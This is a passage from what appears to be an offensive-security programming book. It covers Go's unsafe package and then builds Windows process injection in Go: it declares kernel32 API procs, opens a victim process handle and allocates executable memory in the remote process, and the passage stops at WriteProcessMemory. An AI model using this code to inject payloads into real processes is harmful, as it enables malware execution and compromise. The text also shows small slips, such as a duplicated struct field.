This section provides the groundwork you need in order to
manipulate memory, but you should also explore Go’s official
documentation further.
We’ll bypass Go’s safety precautions by using Go’s unsafe
package (mentioned in Chapter 9), which contains operations
that step around the type safety of Go programs. Go has laid
out four fundamental guidelines to help us out:
A pointer value of any type can be converted to an unsafe.Pointer.
An unsafe.Pointer can be converted to a pointer value of any type.
A uintptr can be converted to an unsafe.Pointer.
An unsafe.Pointer can be converted to a uintptr.
WARNING
Keep in mind that packages that import the unsafe package may not be
portable, and that although Go typically ensures Go version 1 compatibility,
using the unsafe package breaks all guarantees of this.
The uintptr type allows you to perform type conversion or
arithmetic between native safe types, among other uses.
Although uintptr is an integer type, it’s used extensively to
represent a memory address. When used with type-safe
pointers, Go’s native garbage collector will maintain relevant
references at runtime.
However, the situation changes when unsafe.Pointer is
introduced. Recall that uintptr is essentially just an unsigned
integer. If a pointer value is created using unsafe.Pointer and then
assigned to uintptr, there’s no guarantee that Go’s garbage
collector will maintain the integrity of the referenced memory
location’s value. Figure 12-4 helps to further describe the
issue.
Figure 12-4: A potentially dangerous pointer when using uintptr and unsafe.Pointer
The top half of the image depicts uintptr with a reference
value to a Go type-safe pointer. As such, it will maintain its
reference at runtime, along with austere garbage collection.
The lower half of the image demonstrates that uintptr, although
it references an unsafe.Pointer type, can be garbage collected,
considering Go doesn’t preserve nor manage pointers to
arbitrary data types. Listing 12-1 represents the issue.
func state() {
var onload = createEvents("onload") ❶
var receive = createEvents("receive") ❷
var success = createEvents("success") ❸
mapEvents := make(map[string]interface{})
mapEvents["messageOnload"] = unsafe.Pointer(onload)
mapEvents["messageReceive"] = unsafe.Pointer(receive) ❹
mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success)) ❺
//This line is safe - retains orginal value
fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer))) ❻
//This line is unsafe - original value could be garbage collected
fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr))))
❼
}
func createEvents(s string)❽ *string {
return &s
}
Listing 12-1: Using uintptr both securely and insecurely with unsafe.Pointer
This code listing could be someone’s attempt at creating a
state machine, for example. It has three variables, assigned
their respective pointer values of onload ❶, receive ❷, and success
❸ by calling the createEvents() ❽ function. We then create a
map containing a key of type string along with a value of type
interface{}. We use the interface{} type because it can receive
disparate data types. In this case, we’ll use it to receive both
unsafe.Pointer ❹ and uintptr ❺ values.
At this point, you most likely have spotted the dangerous
pieces of code. Although the mapEvents["messageRecieve"] map
entry ❹ is of type unsafe.Pointer, it still maintains its original
reference to the receive ❷ variable and will provide the same
consistent output ❻ as it did originally. Contrarily, the
mapEvents["messageSuccess"] map entry ❺ is of type uintptr. This
means that as soon as the unsafe.Pointer value referencing the
success variable is assigned to a uintptr type, the success variable ❸
is free to be garbage collected. Again, uintptr is just a type
holding a literal integer of a memory address, not a reference
to a pointer. As a result, there’s no guarantee that the expected
output ❼ will be produced, as the value may no longer be
present.
Is there a safe way to use uintptr with unsafe.Pointer? We can do
so by taking advantage of runtime.Keepalive, which can prevent
the garbage collection of a variable. Let’s take a look at this by
modifying our prior code block (Listing 12-2).
func state() {
var onload = createEvents("onload")
var receive = createEvents("receive")
var success❶ = createEvents("success")
mapEvents := make(map[string]interface{})
mapEvents["messageOnload"] = unsafe.Pointer(onload)
mapEvents["messageReceive"] = unsafe.Pointer(receive)
mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success))❷
//This line is safe - retains orginal value
fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer)))
//This line is unsafe - original value could be garbage collected
fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr))))
runtime.KeepAlive(success) ❸
}
func createEvents(s string) *string {
return &s
}
Listing 12-2: Listing 7-2: Using the runtime.KeepAlive() function to prevent garbage
collection of a variable
Seriously, we’ve added only one small line of code ❸!
This line, runtime.KeepAlive(success), tells the Go runtime to ensure
that the success variable remains accessible until it’s explicitly
released or the run state ends. This means that although the
success variable ❶ is stored as uintptr ❷, it can’t be garbage
collected because of the explicit runtime.KeepAlive() directive.
Be aware that the Go syscall package extensively uses
uintptr(unsafe.Pointer()) throughout, and although certain functions,
like syscall9(), have type safety through exception, not all the
functions employ this. Further, as you hack about your own
project code, you’ll almost certainly run into situations that
warrant manipulating heap or stack memory in an unsafe
manner.
PERFORMING PROCESS INJECTION
WITH THE SYSCALL PACKAGE
Often, we need to inject our own code into a process. This
may be because we want to gain remote command line access
to a system (shell), or even debug a runtime application when
the source code isn’t available. Understanding the mechanics
of process injection will also help you perform more
interesting tasks, such as loading memory-resident malware or
hooking functions. Either way, this section demonstrates how
to use Go to interact with the Microsoft Windows APIs in
order to perform process injection. We’ll inject a payload
stored on a disk into existing process memory. Figure 12-5
describes the overall chain of events.
Figure 12-5: Basic process injection
In step 1, we use the OpenProcess() Windows function to
establish a process handle, along with the desired process
access rights. This is a requirement for process-level
interaction, whether we’re dealing with a local or remote
process.
Once the requisite process handle has been obtained, we
use it in step 2, along with the VirtualAllocEx() Windows
function, to allocate virtual memory within the remote process.
This is a requirement for loading byte-level code, such as
shellcode or a DLL, into the remote processes’ memory.
In step 3, we load byte-level code into memory by using
the WriteProcessMemory() Windows function. At this point in the
injection process, we, as attackers, get to decide how creative
to be with our shellcode or DLL. This is also the place where
you might need to inject debugging code when attempting to
understand a running program.
Finally, in step 4, we use the CreateRemoteThread() Windows
function as a means to call a native exported Windows DLL
function, such as LoadLibraryA(), located in Kernel32.dll, so that
we can execute the code previously placed within the process
by using WriteProcessMemory().
The four steps we just described provide a fundamental
process injection example. We’ll define a few additional files
and functions within our overall process injection example that
aren’t necessarily described here, although we’ll describe them
in detail as we encounter them.
Defining the Windows DLLs and Assigning
Variables
The first step is to create the winmods file in Listing 12-3.
(All the code listings at the root location of / exist under the
provided github repo https://github.com/blackhat-go/bhg/.)
This file defines the native Windows DLL, which maintains
exported system-level APIs, that we’ll call by using the Go
syscall package. The winmods file contains declarations and
assignments of more Windows DLL module references than
required for our sample project, but we’ll document them so
that you can leverage those in more advanced injection code.
import "syscall"
var (
❶ ModKernel32 = syscall.NewLazyDLL("kernel32.dll")
modUser32 = syscall.NewLazyDLL("user32.dll")
modAdvapi32 = syscall.NewLazyDLL("Advapi32.dll")
ProcOpenProcessToken = modAdvapi32.NewProc("GetProcessToken")
ProcLookupPrivilegeValueW =
modAdvapi32.NewProc("LookupPrivilegeValueW")
ProcLookupPrivilegeNameW =
modAdvapi32.NewProc("LookupPrivilegeNameW")
ProcAdjustTokenPrivileges =
modAdvapi32.NewProc("AdjustTokenPrivileges")
ProcGetAsyncKeyState = modUser32.NewProc("GetAsyncKeyState")
ProcVirtualAlloc = ModKernel32.NewProc("VirtualAlloc")
ProcCreateThread = ModKernel32.NewProc("CreateThread")
ProcWaitForSingleObject = ModKernel32.NewProc("WaitForSingleObject")
ProcVirtualAllocEx = ModKernel32.NewProc("VirtualAllocEx")
ProcVirtualFreeEx = ModKernel32.NewProc("VirtualFreeEx")
ProcCreateRemoteThread = ModKernel32.NewProc("CreateRemoteThread")
ProcGetLastError = ModKernel32.NewProc("GetLastError")
ProcWriteProcessMemory = ModKernel32.NewProc("WriteProcessMemory")
❷ ProcOpenProcess = ModKernel32.NewProc("OpenProcess")
ProcGetCurrentProcess = ModKernel32.NewProc("GetCurrentProcess")
ProcIsDebuggerPresent = ModKernel32.NewProc("IsDebuggerPresent")
ProcGetProcAddress = ModKernel32.NewProc("GetProcAddress")
ProcCloseHandle = ModKernel32.NewProc("CloseHandle")
ProcGetExitCodeThread = ModKernel32.NewProc("GetExitCodeThread")
)
Listing 12-3: The winmods file (/ch-12/procInjector/winsys/winmods.go)
We use the NewLazyDLL() method to load the Kernel32 DLL
❶. Kernel32 manages much of the internal Windows process
functionality, such as addressing, handling, memory
allocation, and more. (It’s worth noting that, as of Go version
1.12.2, you can use a couple of new functions to better load
DLLs and prevent system DLL hijacking attacks: LoadLibraryEx()
and NewLazySystemDLL().)
Before we can interact with the DLL, we must establish a
variable that we can use in our code. We do this by calling
module.NewProc for each API that we’ll need to use. At ❷, we
call it against OpenProcess() and assign it to an exported variable
called ProcOpenProcess. The use of OpenProcess() is arbitrary; it’s
intended to demonstrate the technique for assigning any
exported Windows DLL function to a descriptive variable
name.
Obtaining a Process Token with the OpenProcess
Windows API
Next, we build out the OpenProcessHandle() function, which we’ll
use to obtain a process handle token. We will likely use the
terms token and handle interchangeably throughout the code,
but realize that every process within a Windows system has a
unique process token. This provides a means to enforce
relevant security models, such as Mandatory Integrity Control,
a complex security model (and one that is worth investigating
in order to get more acquainted with process-level mechanics).
The security models consist of such items as process-level
rights and privileges, for example, and dictate how both
unprivileged and elevated processes can interact with one
another.
First, let’s take a look at the C++ OpenProcess() data structure
as defined within the Window API documentation (Listing 12-
4). We’ll define this object as if we intended to call it from
native Windows C++ code. However, we won’t be doing this,
because we’ll be defining this object to be used with Go’s
syscall package. Therefore, we’ll need to translate this object to
standard Go data types.
HANDLE OpenProcess(
DWORD❶ dwDesiredAccess,
BOOL bInheritHandle,
DWORD dwProcessId
);
Listing 12-4: An arbitrary Windows C++ object and data types
The first necessary task is to translate DWORD ❶ to a usable
type that Go maintains. A DWORD is defined by Microsoft as a
32-bit unsigned integer, which corresponds to Go’s uint32 type.
The DWORD value states that it must contain dwDesiredAccess or,
as the documentation states, “one or more of the process
access rights.” Process access rights define the actions we
wish to take upon a process, given a valid process token.
We want to declare a variety of process access rights. Since
these values won’t change, we place such relevant values in a
Go constants file, as shown in Listing 12-5. Each line in this
list defines a process access right. The list contains almost
every available process access right, but we will use only the
ones necessary for obtaining a process handle.
const (
//
docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
PROCESS_CREATE_PROCESS = 0x0080
PROCESS_CREATE_THREAD = 0x0002
PROCESS_DUP_HANDLE = 0x0040
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_SET_INFORMATION = 0x0200
PROCESS_SET_QUOTA = 0x0100
PROCESS_SUSPEND_RESUME = 0x0800
PROCESS_TERMINATE = 0x0001
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_ALL_ACCESS = 0x001F0FFF
)
Listing 12-5: A constants section declaring process access rights (/ch-
12/procInjector/winsys/constants.go)
All the process access rights we defined in Listing 12-5
reconcile with their respective constant hexadecimal values,
which is the format they need to be in to assign them to a Go
variable.
One issue that we’d like to describe prior to reviewing
Listing 12-6 is that most of the following process injection
functions, not just OpenProcessHandle(), will consume a custom
object of type Inject and return a value of type error. The Inject
struct object (Listing 12-6) will contain various values that
will be provided to the relevant Windows function via syscall.
type Inject struct {
Pid uint32
DllPath string
DLLSize uint32
Privilege string
RemoteProcHandle uintptr
Lpaddr uintptr
LoadLibAddr uintptr
RThread uintptr
Token TOKEN
Token TOKEN
}
type TOKEN struct {
tokenHandle syscall.Token
}
Listing 12-6: The Inject struct used to hold certain process injection data types (/ch-
12 /procInjector/winsys/models.go)
Listing 12-7 illustrates our first actual function,
OpenProcessHandle(). Let’s take a look at the following code block
and discuss the various details.
func OpenProcessHandle(i *Inject) error {
❶ var rights uint32 = PROCESS_CREATE_THREAD |
PROCESS_QUERY_INFORMATION |
PROCESS_VM_OPERATION |
PROCESS_VM_WRITE |
PROCESS_VM_READ
❷ var inheritHandle uint32 = 0
❸ var processID uint32 = i.Pid
❹ remoteProcHandle, _, lastErr❺ := ProcOpenProcess.Call❻(
uintptr(rights), // DWORD dwDesiredAccess
uintptr(inheritHandle), // BOOL bInheritHandle
uintptr(processID)) // DWORD dwProcessId
if remoteProcHandle == 0 {
return errors.Wrap(lastErr, `[!] ERROR :
Can't Open Remote Process. Maybe running w elevated integrity?`)
}
i.RemoteProcHandle = remoteProcHandle
fmt.Printf("[-] Input PID: %v\n", i.Pid)
fmt.Printf("[-] Input DLL: %v\n", i.DllPath)
fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))
return nil
}
Listing 12-7: The OpenProcessHandle() function used to obtain a process handle (/ch-
12 /procInjector/winsys/inject.go)
The code starts by assigning process access rights to the
uint32 variable called rights ❶. The actual values assigned
include PROCESS_CREATE_THREAD, which allows us to create a
thread on our remote process. Following that is
PROCESS_QUERY_INFORMAITON, which gives us the ability to
generically query details about the remote process. The last
three process access rights, PROCESS_VM_OPERATION,
PROCESS_VM_WRITE, and PROCESS_VM_READ, all provide the
access rights to manage the remote process virtual memory.
The next declared variable, inheritHandle ❷, dictates whether
our new process handle will inherit the existing handle. We
pass in 0 to indicate a Boolean false value, as we want a new
process handle. Immediately following is the processID ❸
variable containing the PID of the victim process. All the
while, we reconcile our variable types with the Windows API
documentation, such that both our declared variables are of
type uint32. This pattern continues until we make the system
call by using ProcOpenProcess.Call() ❻ .
The .Call() method consumes a varying number of uintptr
values, which, if we were to look at the Call() function
signature, would be declared literally as ...uintptr. Additionally,
the return types are designated as uintptr ❹ and error ❺. Further,
the error type is named lastErr ❺, which you’ll find referenced
in the Windows API documentation, and contains the returned
error value as defined by the actual called function.
Manipulating Memory with the VirtualAllocEx
Windows API
Now that we have a remote process handle, we need a means
to allocate virtual memory within the remote process. This is
necessary in order to set aside a region of memory and
initialize it prior to writing to it. Let’s build that out now.
Place the function defined in Listing 12-8 immediately after
the function defined in Listing 12-7. (We will continue to
append functions, one after another, as we navigate the process
injection code.)
func VirtualAllocEx(i *Inject) error {
var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
var flProtect uint32 = PAGE_EXECUTE_READWRITE
lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
i.RemoteProcHandle, // HANDLE hProcess
uintptr(nullRef), // LPVOID lpAddress ❶
uintptr(i.DLLSize), // SIZE_T dwSize
uintptr(flAllocationType), // DWORD flAllocationType
//
https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants
uintptr(flProtect)) // DWORD flProtect
if lpBaseAddress == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Can't Allocate Memory On Remote
Process.")
}
i.Lpaddr = lpBaseAddress
fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr))
return nil
}
Listing 12-8: Allocating a region of memory in the remote process via VirtualAllocEx
(/ch-12/procInjector /winsys/inject.go)
Unlike the previous OpenProcess() system call, we introduce a
new detail via the nullRef variable ❶. The nil keyword is
reserved by Go for all null intents. However, it’s a typed value,
which means that passing it directly via a syscall without a type
will result in either a runtime error or a type-conversion error
—either way, a bad situation. The fix is simple in this case: we
declare a variable that resolves to a 0 value, such as an integer.
The 0 value can now be reliably passed and interpreted as a null
value by the receiving Windows function.
Writing to Memory with the WriteProcessMemory
Windows API
Next, we’ll use the WriteProcessMemory() function to write to the